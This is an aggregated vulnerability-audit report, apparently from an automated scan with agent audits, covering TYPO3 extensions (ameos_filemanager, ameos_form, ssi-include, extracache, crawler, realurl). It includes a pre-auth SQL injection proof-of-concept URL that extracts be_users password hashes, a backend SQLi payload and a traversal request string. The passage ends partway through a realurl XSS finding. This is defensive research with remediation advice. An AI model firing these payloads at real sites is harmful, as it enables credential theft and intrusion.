# TYPO3 vuln hunt — aggregated findings (with & without source)

_Autonomous run: CodeQL mass-scan + parallel agent audits + version→CVE mapping._

## Agent source-audit reports

### ameos_ameos_filemanager

#### Security Audit — ameos_filemanager (Ameos File Manager)

- **Target:** `/home/user/sources/code/typo3-extensions/ameos_ameos_filemanager`
- **Version:** 3.1.2 (beta), TYPO3 v13.4, PHP >=8.0
- **Type:** Frontend (FE) file manager plugin — browse / download / upload / delete files as FE users
- **Date:** 2026-08-04

## Summary

The FE plugin `FeFilemanagerExplorer` registers unauthenticated-reachable Extbase actions
(`index, search, download, info, upload, remove, edit`) with **no plugin-level login gate**
(`ext_localconf.php:16-31`). Access is enforced only per-object inside `AccessService`, and the
listing/search path is not access-checked at all before hitting the database.

The headline issue is a **SQL injection in the file search** (`query` GET parameter) that is
pre-auth reachable and reachable via a raw, unparameterized `LIKE` clause — this is a regression
of the SQLi originally fixed in **TYPO3-EXT-SA-2017-008** (v1.0.2, 2017). Two access-control
weaknesses (arbitrary-`sys_file` download/info IDOR, and upload with the extension's own
extension-allowlist not enforced) are also present and echo the RCE / information-disclosure items
from the same 2017 advisory.

---

## Finding 1 — SQL Injection in file search (`query` parameter)

- **SEVERITY:** HIGH (Critical if plugin page is public)
- **PRE-AUTH:** YES — `searchAction` has no login/access check; plugin is not login-gated by default.
- **Type:** SQL Injection (CWE-89)

**Source (tainted input):**
`Classes/Controller/Explorer/ExplorerController.php:151`
```php
$files = $this->fileService->search($rootFolder, $this->request->getArgument(self::ARG_QUERY), $sort, $direction);
```
`ARG_QUERY = 'query'` — attacker-controlled GET/POST argument, passed through verbatim.

**Sink:** `Classes/Domain/Repository/FileRepository.php:174-197`
```php
$arrayKeywords = explode(' ', $query);
foreach ($arrayKeywords as $keyword) {
    $keyword = '\'%' . $queryBuilder->escapeLikeWildcards($keyword) . '%\'';   // line 177
    $keywordContraints[] = $queryBuilder->expr()->like('sys_file_metadata.title', $keyword);   // 179
    $keywordContraints[] = $queryBuilder->expr()->like('sys_file_metadata.description', $keyword);
    ... // name, keywords, sys_category.title, filecontent.content
}
$queryBuilder->where($queryBuilder->expr()->or(...$keywordContraints), ...);
...
$query->statement($queryBuilder->getSQL());   // buildQueryWithSorting():226 — raw SQL executed
```

**Why it is injectable (confirmed against core source):**
- The keyword is manually wrapped in single quotes (`'%...%'`) and handed to `ExpressionBuilder::like()`
  as the **value**. Core docblock: *"No automatic quoting/escaping is done"* and it simply concatenates:
  `Connection.php:181` → `escapeLikeWildcards()` = `addcslashes($value, '_%')` — escapes only `_` and `%`,
  **never single quotes**; `ExpressionBuilder.php:176-190 / comparison():73-76` → `field . ' LIKE ' . $value`.
- The final SQL is produced with `$queryBuilder->getSQL()` and executed via Extbase
  `$query->statement($sql)` — i.e. the tainted value lands in the raw query string, **not** a bound parameter.

**Tainted path:** `GET query` → `ExplorerController::searchAction()` → `FileService::search()` →
`FileRepository::search()` → `expr()->like($field, "'%".addcslashes($kw)."%'")` → `getSQL()` →
`Query::statement()->execute()`.

**Exploitability:** A keyword (space-delimited token, so use inline `/**/` for spaces) containing a
single quote breaks out of the string literal. UNION/boolean extraction of arbitrary tables
(`fe_users`, `be_users` password hashes, etc.) is possible.

**PoC (illustrative):**
```
/index.php?id=<pageWithPlugin>
   &tx_ameosfilemanager_fefilemanagerexplorer[action]=search
   &tx_ameosfilemanager_fefilemanagerexplorer[controller]=Explorer\Explorer
   &tx_ameosfilemanager_fefilemanagerexplorer[query]=x')/**/UNION/**/SELECT/**/username,password,3,...FROM/**/be_users-- -
```
(The token has no spaces; the trailing `-- -` comments out the remaining `%'`/`ESCAPE`/`AND identifier LIKE` tail.)

---

## Finding 2 — Broken access control / IDOR: download & info of arbitrary `sys_file` records

- **SEVERITY:** MEDIUM–HIGH
- **PRE-AUTH:** YES for any file whose `sys_file_metadata.fe_group_read` is empty (the default for every
  file not explicitly restricted by this extension).
- **Type:** IDOR / Broken Access Control (CWE-639 / CWE-284) — mirrors the "Information Disclosure" item of TYPO3-EXT-SA-2017-008.

**Source:** `FileController::downloadAction()` (`:227`) and `infoAction()` (`:148`) —
`(int)$this->request->getArgument('file')` is used directly as a `sys_file` uid.

**Sink / confinement gap:** `FileService::load()` → `FileRepository::findByUid()`
with `setRespectStoragePage(false)` (`FileRepository.php:30`). **No check that the file belongs to
the plugin's configured root folder / storage.** Any `sys_file` uid in the whole installation is loadable.

**Access check is permissive by design** — `AccessService::canReadFile()` (`AccessService.php:44-59`):
```php
$fileGroups = $file->getFeGroupRead() ? array_map('intval', explode(',', ...)) : [];
$groupVerdict = empty($fileGroups) || ... ;   // empty groups => TRUE for everyone, incl. anonymous
return $ownerVerdict || $groupVerdict;
```
Any `sys_file` with no `fe_group_read` metadata (e.g. every file in `fileadmin/` not managed by the
extension) returns `true`. `DownloadService::downloadFile()` then `readfile()`s it
(`DownloadService.php:53-87`) and streams it to the anonymous requester.

**Impact:** By iterating the `file` uid an unauthenticated visitor can enumerate and download / read
metadata of files anywhere in the site's FAL storages — outside the folder tree the plugin is scoped
to. Not OS-level path traversal (path is derived from FAL `getPublicUrl()`, not raw request input),
but a cross-storage information-disclosure IDOR.

---

## Finding 3 — File upload: extension-allowlist not enforced; folder add-rights open by default

- **SEVERITY:** MEDIUM (LOW for RCE — see mitigation)
- **PRE-AUTH:** Depends on target folder — `canAddFile()` returns `true` when the folder's
  `fe_group_addfile` is empty (`AccessService.php:221-238`), so anonymous upload is possible into an
  unrestricted folder.
- **Type:** Unrestricted Upload / missing validation (CWE-434) — mirrors the RCE item of TYPO3-EXT-SA-2017-008.

**Source/sink:** `FileController::uploadAction()` (`:171-206`) → `UploadService::upload()`
(`UploadService.php:38-70`) calls `$storage->addFile($tmp, $folder, $clientFilename)` directly.

**Gap:** Unlike `editAction` (which validates the replacement file against
`settings['allowedFileExtension']`, `FileController.php:85-98`), **`uploadAction`/`UploadService`
perform no extension or MIME validation** against the configured allowlist
(`jpg,…,pdf,…,svg,…` — note `svg` is allowed → stored-XSS vector when served inline).

**Mitigation limiting RCE:** TYPO3 core `ResourceStorage::addFile()` still applies the global
`BE/fileDenyPattern`, which blocks `.php`/executable extensions by default — so direct PHP-upload RCE
is not reachable through this path on a default install (this is why it is not rated Critical). The
extension nonetheless fails to enforce its own allowlist, permitting upload of disallowed types
(`.html`, `.svg`, etc.) into web-reachable `fileadmin` folders.

---

## Notes / non-findings

- **Sort/direction params** (`sort`, `direction`) in search/listing are safely whitelisted
  (`FileRepository::buildQueryWithSorting()` `:210-222` `in_array($sort, $availableSorting)` + explicit
  `ASC`/`DESC` check) — not injectable.
- **Folder zip download** (`FolderController::downloadAction` → `DownloadService::downloadFolder`) is
  gated by `canReadFolder` and per-file `canReadFile` inside `addToZip()`; same permissive-when-unrestricted
  caveat as Finding 2 applies but no additional traversal.
- XSS: file/folder titles are user-controlled; Fluid auto-escapes by default, so no confirmed
  reflected/stored XSS beyond the SVG-upload vector in Finding 3 (not separately verified in templates).

## Known CVEs / Advisories (cross-reference)

- **TYPO3-EXT-SA-2017-008** (2017-11, reporter Michael Helwig; fixed in **1.0.2**): *Multiple
  vulnerabilities in "File manager" (ameos_filemanager)* — **RCE via unauthenticated arbitrary file
  upload**, **Information Disclosure via missing access check on file info (GET-parameter IDOR)**, and
  **SQL Injection via unescaped user input**. All three bug classes reappear in the v13 3.1.2 code base
  audited here (Findings 1–3), i.e. the 2017 fixes did not carry through the rewrite.
  - https://typo3.org/article/typo3-ext-sa-2017-008
  - https://news.typo3.com/security/advisory/typo3-ext-sa-2017-008
- No CVE ID is assigned to that TYPO3 advisory; no separate CVE was found specific to ameos_filemanager 3.x.

## Recommendations

1. **Finding 1:** Replace the hand-quoted keyword with a bound parameter —
   `$queryBuilder->expr()->like($field, $queryBuilder->createNamedParameter('%'.$queryBuilder->escapeLikeWildcards($kw).'%'))`
   and drop `getSQL()`+`statement()` in favor of the QueryBuilder execution / Extbase constraint API.
2. **Finding 2:** After `FileService::load()`, verify the file's `folder_uid` resolves within the
   plugin's configured root folder subtree before serving download/info; do not rely on empty-group == public.
3. **Finding 3:** Enforce `settings['allowedFileExtension']` (and a MIME check) in `UploadService::upload()`
   as done in `editAction`; reconsider whether empty `fe_group_addfile` should grant anonymous upload.

### ameos_ameos_form

#### ameos/ameos_form — CodeQL "Code injection" @ Trait/SearchableRepository.php:20 / :49

**Verdict: FALSE POSITIVE (not code injection / not RCE).**

Extension: `ameos_ameos_form` (title "Form API"), **version 3.0.2** (`ext_emconf.php`).

## Sink

`Classes/Domain/Repository/Trait/SearchableRepository.php`, `getQueryClause(?array $clause, $query)`:

```php
18  switch ($clause['type']) {
19      case 'contains':
20          $queryClause = $query->$clause['type']($clause['field'], $clause['value']);  // sink 1
...
47      default:
48          $type = (string)$clause['type'];
49          $queryClause = $query->$type($clause['field'], $clause['value']);            // sink 2
```

Dangerous op: **dynamic method call** on `$query` with variable method name `$clause['type']`.

## Why it is NOT code injection / RCE

1. **`$clause['type']` is not request-controlled.** `$query` is a fixed Extbase `QueryInterface` (from `$this->createQuery()`), and the method name comes from `$clause['type']`, which is set by **hardcoded literals** inside each element's `getClause()`:
   - `ElementAbstract::getClause()` → `'type' => 'like'` (line 288)
   - `Checkbox` → `'contains'`, `'logicalOr'`; `Radio`/`Range` → `'equals'`; `Dropdown` → `'in'`, `'equals'`.

   These are string constants baked into PHP, chosen by the element **class/config**, never by the submitted value. The only non-literal path is `overrideClause`, a **`\Closure` set programmatically** by the developer via `setOverrideClause()` (`ElementAbstract.php:279,302`) — server code, not request input. `defaultClause` entries come from the developer's `addWhereClause()` (Form.php:495). Sink 1 (`case 'contains'`) is doubly moot: inside that branch `$clause['type']` is provably `'contains'`.

2. **Receiver is a fixed Query object.** Even treating `$type` as free, an attacker could only reach methods that exist on the Extbase Query object (`like`, `equals`, `in`, `contains`, `logicalAnd/Or/Not`, etc.); a non-existent name is a fatal error, not code execution. No `new $cls`, no `eval`, no `call_user_func` of a user string.

3. **What the request actually controls** is `$clause['value']` (the search term, via `$element->getValue()` → wrapped `'%'.value.'%'`) and `$clause['field']` (= `getSearchField()`, a **config/TypoScript-defined** column name). These are the *arguments* to a whitelisted Query method, and they flow into a **parameterized** Extbase query (`$query->like($field, $value)`), so not even SQLi.

## Taint chain (request → sink), informational

- `Form::getResults()` (`Classes/Form/Form.php:534-561`): iterates configured `$this->elements`, calls `$element->getClause()` (hardcoded `type`), merges `$this->defaultClause` (developer-set), then `$this->repository->findByClausesArray($clauses, …)` (line 561).
- `findByClausesArray()` (trait, line 63) → `getQueryClause()` (line 68) → sink.
- Session path (`Form.php:336`) only reads back a stored `['elementvalue']` to repopulate an input field; it never feeds a raw attacker clause array into `findByClausesArray`. Clauses passed to the sink are always freshly rebuilt from element code.

Request input reaches only the `value`/`field` **arguments**, never the method-name (`type`) identity.

## Reachability / auth

Frontend search form, reachable by an **unauthenticated** frontend visitor (uses `frontend.user` session but no login required). Reachability is irrelevant to the verdict: the callable identity is fixed by element PHP, so there is no injection to trigger regardless of who calls it.

## Trigger

None achieves code injection. Submitting a search form (`POST`/`GET` of the form's element fields) only sets the `value` argument of a hardcoded Query method (`like`/`equals`/`in`/…). There is no request field that becomes `$clause['type']`.

**Conclusion: FALSE POSITIVE — dynamic method name is a hardcoded/developer-configured whitelist token, not request input; request controls only parameterized query arguments. Not RCE, not SQLi.**

### andersundsehr_ssi-include

#### andersundsehr/ssi-include — InternalSsiRedirectMiddleware path traversal

## Verdict: FALSE POSITIVE

The CodeQL-flagged `file_get_contents($absolutePath)` sinks at
`Classes/Middleware/InternalSsiRedirectMiddleware.php:37` and `:61` are
neutralized by an anchored allow-list regex applied before the sink.

## Sink

- `Classes/Middleware/InternalSsiRedirectMiddleware.php:37` — `file_get_contents($absolutePath)`
- `Classes/Middleware/InternalSsiRedirectMiddleware.php:61` — `file_get_contents($absolutePath)` (same `$absolutePath`)

Path argument:
```
$ssiInclude   = $request->getQueryParams()['ssi_include'];        // line 29  (SOURCE)
$cacheFileName = RenderIncludeViewHelper::SSI_INCLUDE_DIR . $ssiInclude;  // line 34
$absolutePath  = Environment::getPublicPath() . $cacheFileName;   // line 35
```
`SSI_INCLUDE_DIR = '/typo3temp/tx_ssiinclude/'` (`Classes/ViewHelpers/RenderIncludeViewHelper.php:32`).

## Tainted chain

- SOURCE: `Classes/Middleware/InternalSsiRedirectMiddleware.php:29` — `$request->getQueryParams()['ssi_include']`
- GUARD:  `Classes/Middleware/InternalSsiRedirectMiddleware.php:30` — `preg_match(SsiIncludeCacheFrontend::PATTERN_ENTRYIDENTIFIER, $ssiInclude)` → returns HTTP 400 on non-match
- SINK:   `Classes/Middleware/InternalSsiRedirectMiddleware.php:37` / `:61`

## Confinement (kills the finding)

`Classes/Cache/Frontend/SsiIncludeCacheFrontend.php:20`:
```php
public const PATTERN_ENTRYIDENTIFIER = '/^[a-zA-Z0-9_-]+\.html$/';
```
The pattern is fully anchored (`^…$`). The variable body `[a-zA-Z0-9_-]+`
contains **no `.` and no `/`**; the only dot permitted is the literal `\.html`
suffix. Therefore:
- `../` — rejected (`/` and `.` not in the class; also `..` needs a dot in the body).
- absolute path `/etc/passwd` — rejected (`/`, no `.html`).
- null byte / encoded traversal — rejected (must be `[a-zA-Z0-9_-]` only).

Any value able to reach line 34 is confined to a single flat filename like
`abc_1-2.html` inside the fixed `typo3temp/tx_ssiinclude/` directory. No `../`
survives to the sink. `Environment::getPublicPath()` further pins the base to
the site public root.

## Reachability / auth

- Registered in the **frontend** middleware stack:
  `Configuration/RequestMiddlewares.php` → `'frontend' => [ InternalSsiRedirectMiddleware ]`,
  `before: typo3/cms-core/normalized-params-attribute` (runs very early, **pre-auth**).
- Activates only when `?ssi_include=` query param is present (line 27).
- Auth level: **unauthenticated** (frontend). Reachability is real; the
  vulnerability is not — the guard blocks traversal.

## Trigger attempt (blocked)

```
GET /?ssi_include=../../../../etc/passwd HTTP/1.1
Host: victim
```
→ regex mismatch → `HTTP 400 "ssi_include invalid ../../../../etc/passwd"`.
Only `GET /?ssi_include=<name>.html` (flat, alnum/_/- ) is accepted, reading
`<public>/typo3temp/tx_ssiinclude/<name>.html`.

## Version

Not statically pinned. `ext_emconf.php` sets
`'version' => InstalledVersions::getPrettyVersion('andersundsehr/ssi-include')`
(resolved at runtime from Composer). `composer.json` carries no `version`; no
git tag in the checkout. Requires TYPO3 `^12.4 || ^13.4`, PHP `~8.2–8.5`.
Exact version: **undetermined from source** (runtime Composer lookup).

### aoe_extracache

#### Security Audit — `aoe_extracache` (extracache)

- **Extension:** aoe_extracache / EXT key `extracache`
- **Version audited:** 0.9.1 (`ext_emconf.php`)
- **TYPO3 constraint:** 6.2.0 – 7.6.99, depends on `nc_staticfilecache`
- **Path:** `/home/user/sources/code/typo3-extensions/aoe_extracache`
- **Role:** Extends `nc_staticfilecache`. Its `Dispatcher->dispatch()` is wired into `SC_OPTIONS['tslib/index_ts.php']['preprocessRequest']` (`ext_localconf.php` → `Bootstrap::initializeHooks`, line 65) so it **runs pre-auth on every frontend request** to serve pages straight from the static file cache.

## Summary / verdict

CodeQL flagged three things: reflected XSS at `Dispatcher.php:208`, path traversal in `CacheFileRepository` (83/103/118), and code injection. After tracing request→sink:

- **The pre-auth path (Dispatcher) has NO exploitable reflected XSS.** `echo $content` outputs the *cached HTML file* (`file_get_contents` of a server-rendered cache entry), not any reflected request parameter. This is a **false positive** for reflected XSS.
- **The genuinely tainted sinks (SQLi, arbitrary method call, file delete) all live in the backend `web_info` module (`CacheManagementController` / `modfunc1`) and are POST-AUTH** (require a logged-in backend user with the module). The path traversal is additionally blocked by an explicit `..` check.

**No clean pre-auth vulnerability found.** Real but backend-authed issues are documented below for completeness.

---

## Finding 1 — Reflected XSS at `Dispatcher.php:208` — FALSE POSITIVE (pre-auth)

- **Severity:** Informational (not a reflected XSS)
- **Pre-auth:** Yes (dispatcher runs pre-auth) — but not attacker-reflecting
- **Sink:** `Classes/System/StaticCache/Dispatcher.php:208` `echo $content;`
- **Source of `$content`:** `flush()` (line 76) → `AbstractManager::loadCachedRepresentation()` (`AbstractManager.php:161-171`) → `@file_get_contents($cacheRepresentation)`.

**Analysis.** `$content` is the bytes of a static cache file that TYPO3/`nc_staticfilecache` wrote during a *previous, fully-rendered* frontend response. The dispatcher never echoes the current request's URL, query string, headers, or body. There is no request→`echo` taint path, so this is not reflected XSS.

The only way `$content` becomes malicious is **cache poisoning at write time** (getting attacker HTML persisted into the cache file). Cache writing is done by the `nc_staticfilecache` `createFile_*` hooks against server-rendered output — not attacker-controlled here — so this extension does not introduce a stored-XSS primitive either.

**Related lower-risk observations on the same pre-auth path (theoretical, not concretely exploitable):**
- `AbstractManager::getPageInformationFromCachedRepresentation()` (`AbstractManager.php:119`) runs `unserialize()` on a slice of the cache-file content, and `Dispatcher::initializeFrontEnd()` (`Dispatcher.php:150`) does `$_GET = array_merge($_GET, $pageInformation['GET'])`. Both consume **cache-file content**, which is trusted (server-written). Only reachable as an object-injection / GET-poisoning primitive if an attacker can already write into the cache directory — not a pre-auth remote condition.
- Cache-key path is built from `getHostName()` (`TYPO3_HOST_ONLY`) and `getFileName()` (`TYPO3_SITE_SCRIPT`) in `StaticFileCacheManager::getCachedRepresentation()` (`StaticFileCacheManager.php:30-46`) and read via `file_get_contents`. A fixed `/index.html` suffix is always appended and `TYPO3_HOST_ONLY` is constrained by TYPO3's trusted-hosts protection, so this is not a usable arbitrary-file-read.

---

## Finding 2 — Path traversal in `CacheFileRepository::removeFile/removeFolder` — MITIGATED + POST-AUTH

- **Severity:** Low (mitigated)
- **Pre-auth:** No (backend `web_info` module)
- **Source:** `$_GET['id']` in `CacheManagementController::deleteFileAction()` (`CacheManagementController.php:189`) and `deleteFolderAction()` (line 200)
- **Sink:** `CacheFileRepository.php:83` `unlink($path)`, `:103` `rename($path,...)`, `:118` `rmdir($temp_path)`; `$path = $this->cacheDir . $fileName`

**Tainted path.** `modfunc1::main()` calls `deleteFileAction`, which passes `$_GET['id']` to `removeFile()`. `removeFile()` does `$fileName = base64_decode($id)` then:

```php
if (FALSE === $fileName || FALSE !== strpos($fileName, '..')) {
    throw new Exception('invalid id');
}
$path = $this->cacheDir . $fileName;
```

**Why it is not exploitable as traversal:** any `..` in the decoded name is rejected, and the decoded value is *concatenated after* `cacheDir` (a `PATH_site`-anchored directory), so an absolute-looking payload like `/etc/passwd` becomes `<cacheDir>/etc/passwd` and cannot escape the prefix. Reachable **only** through the backend `web_info` module function (`ext_tables.php:41-47`, `insertModuleFunction('web_info', 'tx_extracache_modfunc1', …)`), which requires an authenticated backend user. Not pre-auth.

---

## Finding 3 — SQL injection in `CacheManagementController` — REAL, POST-AUTH

- **Severity:** Medium (backend-authed)
- **Pre-auth:** No (backend `web_info` module; requires BE login)
- **Source:** backend module data set from `GeneralUtility::_GP(...)` — e.g. `setConfigSearchPhraseForTablePagesAction()` (`CacheManagementController.php:278-285`) stores `searchPhraseForTablePages`; consumed by `getModuleData()`.
- **Sink chain:** `createSqlWhereClauseForDbRecords()` (`CacheManagementController.php:357-370`) builds
  `$sqlWhere .= ' AND '.$field.' like \'%'.$value.'%\''` from an unescaped, user-split `field:value` phrase → passed as raw `$where` to `CacheDatabaseEntryRepository::query()` (`CacheDatabaseEntryRepository.php:61-63`) → `$GLOBALS['TYPO3_DB']->exec_SELECTgetRows('*', $table, $where, …)`.

Both `$field` and `$value` reach the SQL string with no quoting/`fullQuoteStr`, so a backend user viewing the cache-manager tables can inject SQL (e.g. phrase `uid=1) UNION SELECT ... -- `). Also note `allDatabaseEntrysForTablePagesAction` (line 134-143) and `allDatabaseEntrysForTableStaticCacheAction` (149-158) feed the same helper. Genuine SQLi, but gated behind backend authentication + module access — **not pre-auth**.

**PoC (requires BE session):** In the "Static Cache" web_info module, set the table search filter to `uid:0 OR 1=1) UNION SELECT ...--`. The `field`/`value` split on `:` lands unescaped in the `WHERE`.

---

## Finding 4 — Arbitrary controller-method invocation via `action` — POST-AUTH ("code injection" flag)

- **Severity:** Low (backend-authed, constrained)
- **Pre-auth:** No
- **Source/sink:** `modfunc1/class.tx_extracache_modfunc1.php` `main()`:
  `$action = GeneralUtility::_GP('action'); … $action = $action.'Action'; $output = call_user_func(array($this->cacheManagementController, $action));`

The GET/POST `action` selects which method of `CacheManagementController` is called. This is the likely CodeQL "code-injection" candidate. It is **not** arbitrary PHP execution — the callable target is fixed to the controller instance and the name is suffixed with `Action`, so it can only reach that controller's methods. Reachable only inside the authenticated `web_info` backend module. Low impact (at most calling the module's own actions).

---

## Cross-reference vs advisories

No TYPO3 Security Team advisory (`TYPO3-EXT-SA-*`) is published for `extracache`/`aoe_extracache`; it is a low-distribution AOE extension pinned to legacy TYPO3 6.2–7.6 and uses the removed `$GLOBALS['TYPO3_DB']` API, so it cannot run on supported TYPO3. The backend SQLi (Finding 3) is the most material issue but requires backend access. **Recommendation:** parameterize `createSqlWhereClauseForDbRecords` (whitelist `$field`, `fullQuoteStr($value)`), and treat the extension as end-of-life on unsupported TYPO3.

### aoepeople_crawler

#### Security Audit — `aoepeople_crawler` (crawler)

- **Extension:** aoepeople/crawler / EXT key `crawler`
- **Version audited:** 13.0.0 (`ext_emconf.php`; composer `aoepeople/crawler` / `typo3-ter/crawler`)
- **TYPO3 constraint:** 13.4.0 – 14.4.99, PHP 8.2–8.99
- **Path:** `/home/user/sources/code/typo3-extensions/aoepeople_crawler`
- **Role:** Page-tree crawler for cache warmup / indexing / publishing. UI is a backend module; it also registers **two pre-auth frontend middlewares** (`Configuration/RequestMiddlewares.php`).

## Summary / verdict

CodeQL flagged XSS at `BackendModuleStartCrawlingController.php:135`. Trace + pre-auth review of every request surface:

- **The flagged XSS is POST-AUTH and effectively a non-issue.** Line 135 `echo`s crawl URLs into a forced `application/octet-stream` *attachment download*, inside a backend module requiring an authenticated BE user. Not rendered as HTML, not pre-auth.
- **The real pre-auth surface — the `FrontendUserAuthenticator` middleware (`X-T3CRAWLER` header) — is correctly hardened.** Authentication is a `hash_equals` check against `md5(qid|set_id|encryptionKey)`; the queue id goes through a parameterized query; FE-group elevation reads from the server-side queue record, not from attacker input. Forging it requires the site `encryptionKey` (secret). **Not exploitable pre-auth.**
- **No untrusted deserialization, no pre-auth SSRF.** The middleware uses `json_decode`; the only `unserialize()` is in `cli/bootstrap.php` on `$_SERVER['argv'][3]`, which is not reachable over HTTP.

**No pre-auth vulnerability found.** Details below.

---

## Finding 1 — XSS at `BackendModuleStartCrawlingController.php:135` — POST-AUTH, forced download (effectively FP)

- **Severity:** Low / Informational
- **Pre-auth:** No — backend module `web_site_crawler_*`, `Configuration/Backend/Modules.php` `'access' => 'user'` (authenticated BE user)
- **Sink:** `Classes/Controller/Backend/BackendModuleStartCrawlingController.php:135`
  `echo implode(CRLF, $downloadUrls);` (preceded by `header('Content-Type: application/octet-stream')` and `Content-Disposition: attachment; filename=CrawlerUrls.txt`, line 131-132), then `exit`.
- **Source of `$downloadUrls`:** `CrawlerController->downloadUrls`, populated by `getPageTreeAndUrls()` from the page tree + crawler configuration (line 114-128), triggered only when `_download` is set (`RequestHelper::getBoolFromRequest`).

**Analysis.** The response is a forced file download with a non-HTML content type, so browsers do not render it; there is no reflected-into-HTML context. The URL values derive from crawler configuration/page records, and reaching this code requires an authenticated backend user with the crawler module. Even treated as output-encoding hygiene it is post-auth and low impact. Other user-influenced values rendered in the module (`selectorBox`, line 230-254) are passed through `htmlspecialchars(ENT_QUOTES|ENT_HTML5)`.

---

## Finding 2 — Pre-auth `FrontendUserAuthenticator` middleware — REVIEWED, SECURE

- **Severity:** None (correctly implemented)
- **Pre-auth:** Yes (runs on every frontend request, `RequestMiddlewares.php` `frontend` group)
- **File:** `Classes/Middleware/FrontendUserAuthenticator.php`

**Flow (attacker controls the full `X-T3CRAWLER` header):**
1. `explode(':', $crawlerInformation)` → attacker-chosen `$queueId` and `$hash` (line 67).
2. `findByQueueId($queueId)` (line 134-150) — **parameterized**: `->eq('qid', $this->queryBuilder->createNamedParameter($queueId))`. No SQL injection.
3. `isRequestHashMatchingQueueRecord()` (line 105-117) — `hash_equals($hash, md5($qid . '|' . $set_id . '|' . $GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey']))`. Timing-safe compare, secret-keyed. Forgery requires the site `encryptionKey`.
4. Only on match: `feUserGroupList` is read from `$queueRec['parameters']` (the **server-written** queue row, `json_decode`, line 78) and used to elevate FE user groups (`getFrontendUser`, line 122-132).

**Judgement.** The FE-group elevation is gated behind knowledge of `encryptionKey`, and the group list comes from the DB record rather than from request input, so an unauthenticated attacker cannot forge a request or inject arbitrary groups. `json_decode` (not `unserialize`) removes any object-injection risk on the parameters blob. This is the hardened, current-state implementation. **No vulnerability.**

*(Minor, non-exploitable robustness note: `explode(':', …)` without a limit and no null-check before `findByQueueId` could emit PHP notices on a malformed header, but there is no security impact — a non-matching hash yields a `503` via `ErrorController::unavailableAction`.)*

---

## Finding 3 — Deserialization — REVIEWED, NOT REACHABLE

- **Severity:** None
- **`Classes/Middleware/CrawlerInitialization.php:94`** emits crawler meta as `json_encode(...)` in the `X-T3Crawler-Meta` response header. The code comment (line 92-93) documents the deliberate switch away from `serialize()` precisely to avoid the client unserializing a response header — i.e. the historical deserialization issue is already fixed.
- **`cli/bootstrap.php:` `unserialize(base64_decode($_SERVER['argv'][3]))`** — the header array is produced by `SubProcessExecutionStrategy::fetchUrlContents()` (`base64_encode(serialize($requestHeaders))`, `SubProcessExecutionStrategy.php:79`) and passed as a **CLI argument** to a subprocess. `$_SERVER['argv']` is not populated over HTTP, so this sink is not attacker-reachable from the web. The headers themselves are built from the crawl URL by `buildRequestHeaders()` (self-produced). No untrusted deserialization.

---

## Finding 4 — SSRF / URL fetching — REVIEWED, NOT PRE-AUTH

- **Severity:** None (design), not pre-auth
- **File:** `Classes/CrawlStrategy/SubProcessExecutionStrategy.php`
- The crawler fetches URLs taken from the **queue**, which is populated by backend-configured crawler configurations (backend/CLI), not by unauthenticated input. Execution is `shell_exec` of `php cli/bootstrap.php <basePath> <url> <headers>` with all parts run through `CommandUtility::escapeShellArguments()` + `escapeshellcmd()` (line 81-83) — no command injection. The subprocess invokes the **local** TYPO3 frontend (`getFrontendBasePath()` + local `index.php`), not an arbitrary outbound network client. Scheme is restricted to http/https (line 62). No pre-auth SSRF primitive.

---

## Finding 5 — Ajax `ProcessStatusController` — REVIEWED, POST-AUTH

- `Configuration/Backend/AjaxRoutes.php`: route `crawler_process_status` has `'inheritAccessFromModule' => 'web_site_crawler_process'` → backend-authed. `getProcessStatus` reads a JSON `id`, passes it to `ProcessRepository::findByProcessId` (repository/QueryBuilder), and echoes only process metadata. No injection or pre-auth exposure.

---

## Cross-reference vs advisories

The crawler has historical TYPO3 Security advisories in older major lines (XSS / privilege-escalation and an insecure-deserialization class of issue in the crawler queue/middleware). Version 13.0.0 is a current, actively maintained release: the FE authenticator uses `encryptionKey`+`hash_equals` with parameterized queries, and the meta transport was moved to JSON (`CrawlerInitialization` comment). The reviewed code reflects the **post-fix, hardened** state — no residual pre-auth issue identified. Only the post-auth backend download echo (Finding 1) is worth an output-hygiene cleanup.

### aoepeople_realurl

#### Security Audit: aoepeople/realurl (AOE fork)

- **Target:** `/home/user/sources/code/typo3-extensions/aoepeople_realurl`
- **Version:** `1.12.8.19.AOE` (composer `1.12.8.19`; base RealURL 1.12.8 + AOE patchset)
- **Runtime:** TYPO3 CMS `^7.6 || ^8.7`, PHP `^7.0`
- **Scope:** PRE-AUTH exploitable vulns reachable from the frontend URL decode path (attacker controls URL path + query, runs before any authentication).
- **Date:** 2026-08-04

## Summary

RealURL parses the frontend request path in `Classes/Realurl.php::decodeSpURL()` and helpers, all of which run pre-auth on the attacker-controlled URL. I traced every URL-derived value into SQL sinks, redirect/header sinks, error output, object-injection and path sinks.

**SQL injection: not present.** Every DB query that consumes a URL-derived value routes it through `$GLOBALS['TYPO3_DB']->fullQuoteStr(...)` or `intval()`. The classic RealURL alias-decode SQLi (see Known CVEs) is patched in this 1.12.8 base — the alias/uniqalias/pageAlias lookups (`lookUpTranslation`, `lookUp_uniqAliasToId`, `lookUp_idToUniqAlias`, `pageAliasToID`) and the reverse-lookup wildcard WHERE all quote the attacker value. The one raw-interpolation WHERE flagged for review (`createWildcardWhereClause`, `Pagepath.php:243`) also quotes the URL segment with `fullQuotestr`; the injected `%` wildcards are inside the quoted literal. Not injectable.

**One concrete pre-auth finding:** the raw request URL is reflected, unescaped by the extension, into the TYPO3 404 "reason" string (reflected XSS, conditional on core `pageNotFound_handling`). Open-redirect and header-injection sinks were reviewed and found protected. No object injection on the decode path (the only `unserialize` consumes admin `extConf`, not request data).

---

## Finding 1 — Reflected request URL in 404 "reason" (potential XSS)

- **SEVERITY:** Medium (conditional on TYPO3 core `pageNotFound_handling` configuration)
- **PRE-AUTH:** Yes — reached during frontend URL decode, before authentication.
- **Type:** Reflected Cross-Site Scripting / output-encoding defect.
- **Source:** attacker-controlled request path → `$speakingURIpath` (derived from `TypoScriptFrontendController->siteScript`, i.e. `REQUEST_URI`), `Classes/Realurl.php:958`.
- **Sink:** `Classes/Realurl.php:1206` builds the 404 message with the raw URL and passes it to `decodeSpURL_throw404()` → `Classes/Realurl.php:1786` `TypoScriptFrontendController::pageNotFoundAndExit($msg)`. The extension applies **no** `htmlspecialchars()` to `$msg`.

**Tainted path**

```
REQUEST_URI  →  TSFE->siteScript
             →  $speakingURIpath                         (Realurl.php:958)
             →  '"' . $speakingURIpath . '" could not be found, ...'   (Realurl.php:1206)
             →  decodeSpURL_throw404($msg)               (Realurl.php:1744)
             →  TSFE->pageNotFoundAndExit($msg)          (Realurl.php:1786)  // reason reflected by core
```

